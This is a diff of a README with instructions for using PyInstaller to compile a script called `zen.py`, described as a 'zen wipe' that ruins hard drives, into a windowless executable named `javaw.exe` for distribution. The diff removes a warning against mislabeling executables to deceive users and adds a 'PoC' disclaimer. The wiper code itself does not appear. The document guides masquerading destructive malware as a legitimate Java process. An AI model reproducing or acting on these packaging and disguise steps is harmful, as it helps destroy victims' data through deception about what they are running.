@@ -1,9 +1,10 @@
-# README — Build `zen.py` into `javaw.exe` with PyInstaller
+# Build zen wipe into a exe for HDD hardrive only
+# `zen.py` into `javaw.exe` with PyInstaller
 
 
 Package `zen.py` into a single Windows executable named `javaw.exe` using PyInstaller. Clean machine, start to finish.
 
-> Note: Do not mislabel executables to deceive users. Rename only for legitimate operational reasons.
+> Note: Do not run on a hdd it ruins hdd hard drives this for a poc only.
 
 ---
 
@@ -119,7 +120,7 @@ powershell
 
 ## Summary
 
-* Install Python and Git.
-* Create venv. Install PyInstaller and deps.
+* Install Python and Git pip if not already installed.
+* pip Install PyInstaller .
 * Build with `pyinstaller --onefile --noconsole --name javaw zen.py`.
 * Distribute `dist\javaw.exe`.
